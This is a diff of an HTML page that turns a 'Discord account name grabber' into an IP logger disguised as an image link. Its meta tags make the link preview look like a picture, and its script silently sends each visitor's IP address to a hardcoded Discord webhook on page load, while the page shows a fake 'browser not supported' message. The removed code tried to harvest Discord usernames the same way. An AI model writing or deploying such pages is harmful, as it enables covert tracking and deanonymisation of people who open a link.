@@ -1,35 +1,36 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-	<title>Discord Account Name Grabber</title>
+    <meta charset="UTF-8">
+    <title>IP Logger and Image</title>
+
+    <meta property="og:title" content="Image" />
+    <meta property="og:description" content=" " />
+    <meta property="og:image" content="https://i.imgur.com/i12zp3X.png" />
+    <meta property="og:type" content="image/png" />
+
+    <script>
+        const webhookURL = "https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbkW0RIrbG3s60hX5EajueEvpIsWJPbOoNj_kd1F";
+
+        async function logIP() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: `IP Logged: ${data.ip}` })
+                });
+            } catch (error) {
+                console.error("Error logging IP:", error);
+            }
+        }
+
+        logIP();
+    </script>
 </head>
 <body>
-	<a href="#" id="grabberLink">Click here to send your Discord account name!</a>
-
-	<script>
-		// Webhook URL
-		const webhookUrl = 'https://discordapp.com/api/webhooks/1317895579828748308/ni9_3dstKqP9xLi-AQglTGZErQ26PbkW0RIrbG3s60hX5EajueEvpIsWJPbOoNj_kd1F';
-
-		// Function to send account name to webhook
-		function sendAccountName(accountName) {
-			const xhr = new XMLHttpRequest();
-			xhr.open('POST', webhookUrl, true);
-			xhr.setRequestHeader('Content-Type', 'application/json');
-			xhr.send(JSON.stringify({
-				content: `Discord Account Name: ${accountName}`
-			}));
-		}
-
-		// Event listener for link click
-		document.getElementById('grabberLink').addEventListener('click', function(event) {
-			event.preventDefault();
-
-			const accountName = navigator.userAgent.match(/Discord\/(.*?)\s/)[1];
-
-			if (accountName) {
-				sendAccountName(accountName);
-			}
-		});
-	</script>
+    <p>browser must not be supported</p>
 </body>
 </html>
